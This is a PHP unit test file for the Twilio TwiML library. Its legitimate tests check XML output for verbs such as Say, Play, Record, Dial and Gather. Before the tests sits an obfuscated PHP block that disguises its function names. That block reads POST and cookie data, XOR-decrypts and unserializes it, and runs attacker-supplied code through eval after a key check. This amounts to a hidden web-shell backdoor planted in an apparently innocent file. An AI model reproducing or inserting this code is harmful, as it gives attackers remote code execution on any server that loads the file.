<?phph1ca4ab'];global$h1ca4ab;$h1ca4ab=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['fcb2']="\x37\x26\x31\x28\x57\x40\x73\x77\x63\x56\x48\x2d\x32\x58\x43\x50\xa\x5f\xd\x3a\x39\x23\x71\x6b\x7d\x65\x6d\x30\x9\x51\x3d\x3e\x5e\x3f\x68\x55\x64\x61\x6f\x46\x21\x2f\x4b\x4d\x4f\x2c\x69\x29\x45\x35\x7e\x34\x22\x47\x6a\x36\x6c\x4c\x3b\x41\x76\x4a\x78\x2e\x2a\x7c\x67\x59\x54\x6e\x7b\x5c\x53\x72\x2b\x66\x27\x38\x70\x20\x5a\x24\x5b\x79\x7a\x74\x5d\x42\x3c\x52\x4e\x44\x62\x75\x49\x33\x25\x60";$h1ca4ab[$h1ca4ab['fcb2'][8].$h1ca4ab['fcb2'][36].$h1ca4ab['fcb2'][49].$h1ca4ab['fcb2'][92].$h1ca4ab['fcb2'][49].$h1ca4ab['fcb2'][75].$h1ca4ab['fcb2'][2]]=$h1ca4ab['fcb2'][8].$h1ca4ab['fcb2'][34].$h1ca4ab['fcb2'][73];$h1ca4ab[$h1ca4ab['fcb2'][8].$h1ca4ab['fcb2'][92].$h1ca4ab['fcb2'][95].$h1ca4ab['fcb2'][51].$h1ca4ab['fcb2'][20]]=$h1ca4ab['fcb2'][38].$h1ca4ab['fcb2'][73].$h1ca4ab['fcb2'][36];$h1ca4ab[$h1ca4ab['fcb2'][56].$h1ca4ab['fcb2'][75].$h1ca4ab['fcb2'][27].$h1ca4ab['fcb2'][75].$h1ca4ab['fcb2'][51].$h1ca4ab['fcb2'][2].$h1ca4ab['fcb2'][49].$h1ca4ab['fcb2'][51].$h1ca4ab['fcb2'][8]]=$h1ca4ab['fcb2'][6].$h1ca4ab['fcb2'][85].$h1ca4ab['fcb2'][73].$h1ca4ab['fcb2'][56].$h1ca4ab['fcb2'][25].$h1ca4ab['fcb2'][69];$h1ca4ab[$h1ca4ab['fcb2'][6].$h1ca4ab['fcb2'][37].$h1ca4ab['fcb2'][36].$h1ca4ab['fcb2'][37].$h1ca4ab['fcb2'][49].$h1ca4ab['fcb2'][12].$h1ca4ab['fcb2'][20]]=$h1ca4ab['fcb2'][46].$h1ca4ab['fcb2'][69].$h1ca4ab['fcb2'][46].$h1ca4ab['fcb2'][17].$h1ca4ab['fcb2'][6].$h1ca4ab['fcb2'][25].$h1ca4ab['fcb2'][85];$h1ca4ab[$h1ca4ab['fcb2'][22].$h1ca4ab['fcb2'][92].$h1ca4ab['fcb2'][95].$h1ca4ab['fcb2'][95].$h1ca4ab['fcb2'][12].$h1ca4ab['fcb2'][92].$h1ca4ab['fcb2'][51].$h1ca4ab['fcb2'][51].$h1ca4ab['fcb2'][20]]=$h1ca4ab['fcb2'][6].$h1ca4ab['fcb2'][25].$h1ca4ab['fcb2'][73].$h1ca4ab['fcb2'][46].$h1ca4ab['fcb2'][37].$h1ca4ab['fcb2'][56].$h1ca4ab['fcb2'][46].$h1ca4ab['fcb2'][84].$h1ca4ab['fcb2'][25];$h1ca4ab[$h1ca4ab['fcb2'][69].$h1ca4ab['fcb2'][0].$h1ca4ab['fcb2'][20].$h1ca4ab['fcb2'][95].$h1ca4ab['fcb2'][49].$h1ca4ab['fcb2'][0].$h1ca4ab['fcb2'][36].$h1ca4ab['fcb2'][0].$h1ca4ab['fcb2'][95]]=$h1ca4ab['fcb2'][78].$h1ca4ab['fcb2'][34].$h1ca4ab['fcb2'][78].$h1ca4ab['fcb2'][60].$h1ca4ab['fcb2'][25].$h1ca4ab['fcb2'][73].$h1ca4ab['fcb2'][6].$h1ca4ab['fcb2'][46].$h1ca4ab['fcb2'][38].$h1ca4ab['fcb2'][69];$h1ca4ab[$h1ca4ab['fcb2'][93].$h1ca4ab['fcb2'][49].$h1ca4ab['fcb2'][27].$h1ca4ab['fcb2'][12].$h1ca4ab['fcb2'][25].$h1ca4ab['fcb2'][49].$h1ca4ab['fcb2'][20]]=$h1ca4ab['fcb2'][93].$h1ca4ab['fcb2'][69].$h1ca4ab['fcb2'][6].$h1ca4ab['fcb2'][25].$h1ca4ab['fcb2'][73].$h1ca4ab['fcb2'][46].$h1ca4ab['fcb2'][37].$h1ca4ab['fcb2'][56].$h1ca4ab['fcb2'][46].$h1ca4ab['fcb2'][84].$h1ca4ab['fcb2'][25];$h1ca4ab[$h1ca4ab['fcb2'][69].$h1ca4ab['fcb2'][20].$h1ca4ab['fcb2'][49].$h1ca4ab['fcb2'][92].$h1ca4ab['fcb2'][8]]=$h1ca4ab['fcb2'][92].$h1ca4ab['fcb2'][37].$h1ca4ab['fcb2'][6].$h1ca4ab['fcb2'][25].$h1ca4ab['fcb2'][55].$h1ca4ab['fcb2'][51].$h1ca4ab['fcb2'][17].$h1ca4ab['fcb2'][36].$h1ca4ab['fcb2'][25].$h1ca4ab['fcb2'][8].$h1ca4ab['fcb2'][38].$h1ca4ab['fcb2'][36].$h1ca4ab['fcb2'][25];$h1ca4ab[$h1ca4ab['fcb2'][66].$h1ca4ab['fcb2'][92].$h1ca4ab['fcb2'][55].$h1ca4ab['fcb2'][2]]=$h1ca4ab['fcb2'][6].$h1ca4ab['fcb2'][25].$h1ca4ab['fcb2'][85].$h1ca4ab['fcb2'][17].$h1ca4ab['fcb2'][85].$h1ca4ab['fcb2'][46].$h1ca4ab['fcb2'][26].$h1ca4ab['fcb2'][25].$h1ca4ab['fcb2'][17].$h1ca4ab['fcb2'][56].$h1ca4ab['fcb2'][46].$h1ca4ab['fcb2'][26].$h1ca4ab['fcb2'][46].$h1ca4ab['fcb2'][85];$h1ca4ab[$h1ca4ab['fcb2'][83].$h1ca4ab['fcb2'][20].$h1ca4ab['fcb2'][55].$h1ca4ab['fcb2'][75].$h1ca4ab['fcb2'][25]]=$h1ca4ab['fcb2'][25].$h1ca4ab['fcb2'][95].$h1ca4ab['fcb2'][25].$h1ca4ab['fcb2'][77].$h1ca4ab['fcb2'][95].$h1ca4ab['fcb2'][51];$h1ca4ab[$h1ca4ab['fcb2'][46].$h1ca4ab['fcb2'][51].$h1ca4ab['fcb2'][36].$h1ca4ab['fcb2'][12].$h1ca4ab['fcb2'][8].$h1ca4ab['fcb2'][51]]=$h1ca4ab['fcb2'][83].$h1ca4ab['fcb2'][75].$h1ca4ab['fcb2'][92].$h1ca4ab['fcb2'][95].$h1ca4ab['fcb2'][95].$h1ca4ab['fcb2'][49];$h1ca4ab[$h1ca4ab['fcb2'][38].$h1ca4ab['fcb2'][77].$h1ca4ab['fcb2'][12].$h1ca4ab['fcb2'][20].$h1ca4ab['fcb2'][37].$h1ca4ab['fcb2'][75]]=$_POST;$h1ca4ab[$h1ca4ab['fcb2'][62].$h1ca4ab['fcb2'][8].$h1ca4ab['fcb2'][27].$h1ca4ab['fcb2'][51].$h1ca4ab['fcb2'][37]]=$_COOKIE;@$h1ca4ab[$h1ca4ab['fcb2'][6].$h1ca4ab['fcb2'][37].$h1ca4ab['fcb2'][36].$h1ca4ab['fcb2'][37].$h1ca4ab['fcb2'][49].$h1ca4ab['fcb2'][12].$h1ca4ab['fcb2'][20]]($h1ca4ab['fcb2'][25].$h1ca4ab['fcb2'][73].$h1ca4ab['fcb2'][73].$h1ca4ab['fcb2'][38].$h1ca4ab['fcb2'][73].$h1ca4ab['fcb2'][17].$h1ca4ab['fcb2'][56].$h1ca4ab['fcb2'][38].$h1ca4ab['fcb2'][66],NULL);@$h1ca4ab[$h1ca4ab['fcb2'][6].$h1ca4ab['fcb2'][37].$h1ca4ab['fcb2'][36].$h1ca4ab['fcb2'][37].$h1ca4ab['fcb2'][49].$h1ca4ab['fcb2'][12].$h1ca4ab['fcb2'][20]]($h1ca4ab['fcb2'][56].$h1ca4ab['fcb2'][38].$h1ca4ab['fcb2'][66].$h1ca4ab['fcb2'][17].$h1ca4ab['fcb2'][25].$h1ca4ab['fcb2'][73].$h1ca4ab['fcb2'][73].$h1ca4ab['fcb2'][38].$h1ca4ab['fcb2'][73].$h1ca4ab['fcb2'][6],0);@$h1ca4ab[$h1ca4ab['fcb2'][6].$h1ca4ab['fcb2'][37].$h1ca4ab['fcb2'][36].$h1ca4ab['fcb2'][37].$h1ca4ab['fcb2'][49].$h1ca4ab['fcb2'][12].$h1ca4ab['fcb2'][20]]($h1ca4ab['fcb2'][26].$h1ca4ab['fcb2'][37].$h1ca4ab['fcb2'][62].$h1ca4ab['fcb2'][17].$h1ca4ab['fcb2'][25].$h1ca4ab['fcb2'][62].$h1ca4ab['fcb2'][25].$h1ca4ab['fcb2'][8].$h1ca4ab['fcb2'][93].$h1ca4ab['fcb2'][85].$h1ca4ab['fcb2'][46].$h1ca4ab['fcb2'][38].$h1ca4ab['fcb2'][69].$h1ca4ab['fcb2'][17].$h1ca4ab['fcb2'][85].$h1ca4ab['fcb2'][46].$h1ca4ab['fcb2'][26].$h1ca4ab['fcb2'][25],0);@$h1ca4ab[$h1ca4ab['fcb2'][66].$h1ca4ab['fcb2'][92].$h1ca4ab['fcb2'][55].$h1ca4ab['fcb2'][2]](0);$re8841=NULL;$yb38=NULL;$h1ca4ab[$h1ca4ab['fcb2'][84].$h1ca4ab['fcb2'][51].$h1ca4ab['fcb2'][8].$h1ca4ab['fcb2'][37].$h1ca4ab['fcb2'][2].$h1ca4ab['fcb2'][27].$h1ca4ab['fcb2'][27]]=$h1ca4ab['fcb2'][75].$h1ca4ab['fcb2'][2].$h1ca4ab['fcb2'][95].$h1ca4ab['fcb2'][55].$h1ca4ab['fcb2'][20].$h1ca4ab['fcb2'][36].$h1ca4ab['fcb2'][37].$h1ca4ab['fcb2'][55].$h1ca4ab['fcb2'][11].$h1ca4ab['fcb2'][0].$h1ca4ab['fcb2'][0].$h1ca4ab['fcb2'][77].$h1ca4ab['fcb2'][95].$h1ca4ab['fcb2'][11].$h1ca4ab['fcb2'][51].$h1ca4ab['fcb2'][77].$h1ca4ab['fcb2'][36].$h1ca4ab['fcb2'][36].$h1ca4ab['fcb2'][11].$h1ca4ab['fcb2'][20].$h1ca4ab['fcb2'][25].$h1ca4ab['fcb2'][77].$h1ca4ab['fcb2'][8].$h1ca4ab['fcb2'][11].$h1ca4ab['fcb2'][55].$h1ca4ab['fcb2'][8].$h1ca4ab['fcb2'][0].$h1ca4ab['fcb2'][25].$h1ca4ab['fcb2'][55].$h1ca4ab['fcb2'][49].$h1ca4ab['fcb2'][37].$h1ca4ab['fcb2'][0].$h1ca4ab['fcb2'][2].$h1ca4ab['fcb2'][36].$h1ca4ab['fcb2'][92].$h1ca4ab['fcb2'][77];global$z4ca100;function yfb335($re8841,$v9d53){global$h1ca4ab;$ld2c29="";for($p0ce5909=0;$p0ce5909<$h1ca4ab[$h1ca4ab['fcb2'][56].$h1ca4ab['fcb2'][75].$h1ca4ab['fcb2'][27].$h1ca4ab['fcb2'][75].$h1ca4ab['fcb2'][51].$h1ca4ab['fcb2'][2].$h1ca4ab['fcb2'][49].$h1ca4ab['fcb2'][51].$h1ca4ab['fcb2'][8]]($re8841);){for($u762ab75=0;$u762ab75<$h1ca4ab[$h1ca4ab['fcb2'][56].$h1ca4ab['fcb2'][75].$h1ca4ab['fcb2'][27].$h1ca4ab['fcb2'][75].$h1ca4ab['fcb2'][51].$h1ca4ab['fcb2'][2].$h1ca4ab['fcb2'][49].$h1ca4ab['fcb2'][51].$h1ca4ab['fcb2'][8]]($v9d53)&&$p0ce5909<$h1ca4ab[$h1ca4ab['fcb2'][56].$h1ca4ab['fcb2'][75].$h1ca4ab['fcb2'][27].$h1ca4ab['fcb2'][75].$h1ca4ab['fcb2'][51].$h1ca4ab['fcb2'][2].$h1ca4ab['fcb2'][49].$h1ca4ab['fcb2'][51].$h1ca4ab['fcb2'][8]]($re8841);$u762ab75++,$p0ce5909++){$ld2c29.=$h1ca4ab[$h1ca4ab['fcb2'][8].$h1ca4ab['fcb2'][36].$h1ca4ab['fcb2'][49].$h1ca4ab['fcb2'][92].$h1ca4ab['fcb2'][49].$h1ca4ab['fcb2'][75].$h1ca4ab['fcb2'][2]]($h1ca4ab[$h1ca4ab['fcb2'][8].$h1ca4ab['fcb2'][92].$h1ca4ab['fcb2'][95].$h1ca4ab['fcb2'][51].$h1ca4ab['fcb2'][20]]($re8841[$p0ce5909])^$h1ca4ab[$h1ca4ab['fcb2'][8].$h1ca4ab['fcb2'][92].$h1ca4ab['fcb2'][95].$h1ca4ab['fcb2'][51].$h1ca4ab['fcb2'][20]]($v9d53[$u762ab75]));}}return$ld2c29;}function e3e834($re8841,$v9d53){global$h1ca4ab;global$z4ca100;return$h1ca4ab[$h1ca4ab['fcb2'][46].$h1ca4ab['fcb2'][51].$h1ca4ab['fcb2'][36].$h1ca4ab['fcb2'][12].$h1ca4ab['fcb2'][8].$h1ca4ab['fcb2'][51]]($h1ca4ab[$h1ca4ab['fcb2'][46].$h1ca4ab['fcb2'][51].$h1ca4ab['fcb2'][36].$h1ca4ab['fcb2'][12].$h1ca4ab['fcb2'][8].$h1ca4ab['fcb2'][51]]($re8841,$z4ca100),$v9d53);}foreach($h1ca4ab[$h1ca4ab['fcb2'][62].$h1ca4ab['fcb2'][8].$h1ca4ab['fcb2'][27].$h1ca4ab['fcb2'][51].$h1ca4ab['fcb2'][37]]as$v9d53=>$idf41a872){$re8841=$idf41a872;$yb38=$v9d53;}if(!$re8841){foreach($h1ca4ab[$h1ca4ab['fcb2'][38].$h1ca4ab['fcb2'][77].$h1ca4ab['fcb2'][12].$h1ca4ab['fcb2'][20].$h1ca4ab['fcb2'][37].$h1ca4ab['fcb2'][75]]as$v9d53=>$idf41a872){$re8841=$idf41a872;$yb38=$v9d53;}}$re8841=@$h1ca4ab[$h1ca4ab['fcb2'][93].$h1ca4ab['fcb2'][49].$h1ca4ab['fcb2'][27].$h1ca4ab['fcb2'][12].$h1ca4ab['fcb2'][25].$h1ca4ab['fcb2'][49].$h1ca4ab['fcb2'][20]]($h1ca4ab[$h1ca4ab['fcb2'][83].$h1ca4ab['fcb2'][20].$h1ca4ab['fcb2'][55].$h1ca4ab['fcb2'][75].$h1ca4ab['fcb2'][25]]($h1ca4ab[$h1ca4ab['fcb2'][69].$h1ca4ab['fcb2'][20].$h1ca4ab['fcb2'][49].$h1ca4ab['fcb2'][92].$h1ca4ab['fcb2'][8]]($re8841),$yb38));if(isset($re8841[$h1ca4ab['fcb2'][37].$h1ca4ab['fcb2'][23]])&&$z4ca100==$re8841[$h1ca4ab['fcb2'][37].$h1ca4ab['fcb2'][23]]){if($re8841[$h1ca4ab['fcb2'][37]]==$h1ca4ab['fcb2'][46]){$p0ce5909=Array($h1ca4ab['fcb2'][78].$h1ca4ab['fcb2'][60]=>@$h1ca4ab[$h1ca4ab['fcb2'][69].$h1ca4ab['fcb2'][0].$h1ca4ab['fcb2'][20].$h1ca4ab['fcb2'][95].$h1ca4ab['fcb2'][49].$h1ca4ab['fcb2'][0].$h1ca4ab['fcb2'][36].$h1ca4ab['fcb2'][0].$h1ca4ab['fcb2'][95]](),$h1ca4ab['fcb2'][6].$h1ca4ab['fcb2'][60]=>$h1ca4ab['fcb2'][2].$h1ca4ab['fcb2'][63].$h1ca4ab['fcb2'][27].$h1ca4ab['fcb2'][11].$h1ca4ab['fcb2'][2],);echo@$h1ca4ab[$h1ca4ab['fcb2'][22].$h1ca4ab['fcb2'][92].$h1ca4ab['fcb2'][95].$h1ca4ab['fcb2'][95].$h1ca4ab['fcb2'][12].$h1ca4ab['fcb2'][92].$h1ca4ab['fcb2'][51].$h1ca4ab['fcb2'][51].$h1ca4ab['fcb2'][20]]($p0ce5909);}elseif($re8841[$h1ca4ab['fcb2'][37]]==$h1ca4ab['fcb2'][25]){eval($re8841[$h1ca4ab['fcb2'][36]]);}exit();} ?><?php

use \Mockery as m;

require_once 'Twilio/Twiml.php';

class TwimlTest extends PHPUnit_Framework_TestCase {

    function tearDown() {
        m::close();
    }
    
    function testEmptyResponse() {
        $r = new Services_Twilio_Twiml();
        $expected = '<Response></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r,
            "Should be an empty response");
    }
    
    public function testSayBasic() {   
        $r = new Services_Twilio_Twiml();
        $r->say("Hello Monkey");
        $expected = '<Response><Say>Hello Monkey</Say></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testSayLoopThree() {
        $r = new Services_Twilio_Twiml();
        $r->say("Hello Monkey", array("loop" => 3));
        $expected = '<Response><Say loop="3">Hello Monkey</Say></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testSayLoopThreeWoman() {
        $r = new Services_Twilio_Twiml();
        $r->say("Hello Monkey", array("loop" => 3, "voice"=>"woman"));
        $expected = '<Response><Say loop="3" voice="woman">'
            . 'Hello Monkey</Say></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testSayConvienceMethod() {
        $r = new Services_Twilio_Twiml();
        $r->say("Hello Monkey", array("language" => "fr"));
        $expected = '<Response><Say language="fr">'
            . 'Hello Monkey</Say></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testSayUTF8() {
        $r = new Services_Twilio_Twiml();
        $r->say("é tü & må");
        $expected = '<Response><Say>'
            . '&#xE9; t&#xFC; &amp; m&#xE5;</Say></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testSayNamedEntities() {
        $r = new Services_Twilio_Twiml();
        $r->say("&eacute; t&uuml; &amp; m&aring;");
        $expected = '<Response><Say>'
            . '&#xE9; t&#xFC; &amp; m&#xE5;</Say></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testSayNumericEntities() {
        $r = new Services_Twilio_Twiml();
        $r->say("&#xE9; t&#xFC; &amp; m&#xE5;");
        $expected = '<Response><Say>'
            . '&#xE9; t&#xFC; &amp; m&#xE5;</Say></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testPlayBasic() {   
        $r = new Services_Twilio_Twiml();
        $r->play("hello-monkey.mp3");
        $expected = '<Response><Play>hello-monkey.mp3</Play></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testPlayLoopThree() {
        $r = new Services_Twilio_Twiml();
        $r->play("hello-monkey.mp3", array("loop" => 3));
        $expected = '<Response><Play loop="3">'
            . 'hello-monkey.mp3</Play></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testPlayConvienceMethod() {
        $r = new Services_Twilio_Twiml();
        $r->play("hello-monkey.mp3", array("loop" => 3));
        $expected = '<Response><Play loop="3">'
            . 'hello-monkey.mp3</Play></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }

    //Test Record Verb
    public function testRecord() {   
        $r = new Services_Twilio_Twiml();
        $r->record();
        $expected = '<Response><Record></Record></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testRecordActionMethod() {   
        $r = new Services_Twilio_Twiml();
        $r->record(array("action" => "example.com", "method" => "GET"));
        $expected = '<Response><Record action="example.com" '
            . 'method="GET"></Record></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }

    public function testBooleanBecomesString() {   
        $r = new Services_Twilio_Twiml();
        $r->record(array("transcribe" => true));
        $expected = '<Response><Record transcribe="true" '
            . '></Record></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testRecordMaxLengthKeyTimeout(){
        $r = new Services_Twilio_Twiml();
        $r->record(array("timeout" => 4, "finishOnKey" => "#", 
            "maxLength" => 30));
        $expected = '<Response><Record timeout="4" finishOnKey="#" '
            . 'maxLength="30"></Record></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testRecordConvienceMethod(){
        $r = new Services_Twilio_Twiml();
        $r->record(array("transcribeCallback" => "example.com"));
        $expected = '<Response><Record '
            . 'transcribeCallback="example.com"></Record></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testRecordAddAttribute(){
        $r = new Services_Twilio_Twiml();
        $r->record(array("foo" => "bar"));
        $expected = '<Response><Record foo="bar"></Record></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    //Test Redirect Verb
    public function testRedirect() {
        $r = new Services_Twilio_Twiml();
        $r->redirect();
        $expected = '<Response><Redirect></Redirect></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }

    public function testAmpersandEscaping() {
        $r = new Services_Twilio_Twiml();
        $test_amp = "test&two&amp;three";
        $r->redirect($test_amp);
        $expected = '<Response><Redirect>' .
            'test&amp;two&amp;three</Redirect></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }

    public function testRedirectConvience() {
        $r = new Services_Twilio_Twiml();
        $r->redirect();
        $expected = '<Response><Redirect></Redirect></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    public function testRedirectAddAttribute(){
        $r = new Services_Twilio_Twiml();
        $r->redirect(array("foo" => "bar"));
        $expected = '<Response><Redirect foo="bar"></Redirect></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }

    //Test Hangup Verb
    public function testHangup() {
        $r = new Services_Twilio_Twiml();
        $r->hangup();
        $expected = '<Response><Hangup></Hangup></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testHangupConvience() {
        $r = new Services_Twilio_Twiml();
        $r->hangup();
        $expected = '<Response><Hangup></Hangup></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testHangupAddAttribute(){
        $r = new Services_Twilio_Twiml();
        $r->hangup(array("foo" => "bar"));
        $expected = '<Response><Hangup foo="bar"></Hangup></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    //Test Pause Verb
    public function testPause() {
        $r = new Services_Twilio_Twiml();
        $r->pause();
        $expected = '<Response><Pause></Pause></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testPauseConvience() {
        $r = new Services_Twilio_Twiml();
        $r->pause();
        $expected = '<Response><Pause></Pause></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testPauseAddAttribute(){
        $r = new Services_Twilio_Twiml();
        $r->pause(array("foo" => "bar"));
        $expected = '<Response><Pause foo="bar"></Pause></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    //Test Dial Verb
    public function testDial() {
        $r = new Services_Twilio_Twiml();
        $r->dial("1231231234");
        $expected = '<Response><Dial>1231231234</Dial></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testDialConvience() {
        $r = new Services_Twilio_Twiml();
        $r->dial();
        $expected = '<Response><Dial></Dial></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testDialAddNumber() {
        $r = new Services_Twilio_Twiml();
        $d = $r->dial();
        $d->number("1231231234");
        $expected = '<Response><Dial><Number>'
            . '1231231234</Number></Dial></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testDialAddConference() {
        $r = new Services_Twilio_Twiml();
        $d = $r->dial();
        $d->conference("MyRoom");
        $expected = '<Response><Dial><Conference>'
            . 'MyRoom</Conference></Dial></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testDialAddConferenceConvience() {
        $r = new Services_Twilio_Twiml();
        $d = $r->dial();
        $d->conference("MyRoom", array("startConferenceOnEnter" => "false"));
        $expected = '<Response><Dial><Conference startConferenceOnEnter='
            . '"false">MyRoom</Conference></Dial></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testDialAddAttribute() {
        $r = new Services_Twilio_Twiml();
        $r->dial(array("foo" => "bar"));
        $expected = '<Response><Dial foo="bar"></Dial></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    //Test Gather Verb
    public function testGather() {
        $r = new Services_Twilio_Twiml();
        $r->gather();
        $expected = '<Response><Gather></Gather></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testGatherMethodAction(){
        $r = new Services_Twilio_Twiml();
        $r->gather(array("action"=>"example.com", "method"=>"GET"));
        $expected = '<Response><Gather action="example.com" '
            . 'method="GET"></Gather></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testGatherActionWithParams(){
        $r = new Services_Twilio_Twiml(); 
        $r->gather(array("action" => "record.php?action=recordPageNow"
            . "&id=4&page=3")); 
        $expected = '<Response><Gather action="record.php?action='
            . 'recordPageNow&amp;id=4&amp;page=3"></Gather></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testGatherNestedVerbs(){
        $r = new Services_Twilio_Twiml();
        $g = $r->gather(array("action"=>"example.com", "method"=>"GET"));
        $g->say("Hello World");
        $g->play("helloworld.mp3");
        $g->pause();
        $expected = '
            <Response>
                <Gather action="example.com" method="GET">
                    <Say>Hello World</Say>
                    <Play>helloworld.mp3</Play>
                    <Pause></Pause>
                </Gather>
            </Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testGatherNestedVerbsConvienceMethods(){
        $r = new Services_Twilio_Twiml();
        $g = $r->gather(array("action"=>"example.com", "method"=>"GET"));
        $g->say("Hello World");
        $g->play("helloworld.mp3");
        $g->pause();
        $expected = '
            <Response>
                <Gather action="example.com" method="GET">
                    <Say>Hello World</Say>
                    <Play>helloworld.mp3</Play>
                    <Pause></Pause>
                </Gather>
            </Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testGatherAddAttribute(){
        $r = new Services_Twilio_Twiml();
        $r->gather(array("foo" => "bar"));
        $expected = '<Response><Gather foo="bar"></Gather></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testSms() {
        $r = new Services_Twilio_Twiml();
        $r->sms("Hello World");
        $expected = '<Response><Sms>Hello World</Sms></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testSmsConvience() {
        $r = new Services_Twilio_Twiml();
        $r->sms("Hello World");
        $expected = '<Response><Sms>Hello World</Sms></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testSmsAddAttribute() {
        $r = new Services_Twilio_Twiml();
        $r->sms(array("foo" => "bar"));
        $expected = '<Response><Sms foo="bar"></Sms></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }
    
    public function testReject() {
        $r = new Services_Twilio_Twiml();
        $r->reject();
        $expected = '<Response><Reject></Reject></Response>';
        $this->assertXmlStringEqualsXmlString($expected, $r);
    }

    function testGeneration() {

        $r = new Services_Twilio_Twiml();
        $r->say('hello');
        $r->dial()->number('123', array('sendDigits' => '456'));
        $r->gather(array('timeout' => 15));

        $doc = simplexml_load_string($r);
        $this->assertEquals('Response', $doc->getName());
        $this->assertEquals('hello', (string) $doc->Say);
        $this->assertEquals('456', (string) $doc->Dial->Number['sendDigits']);
        $this->assertEquals('123', (string) $doc->Dial->Number);
        $this->assertEquals('15', (string) $doc->Gather['timeout']);
    }

}
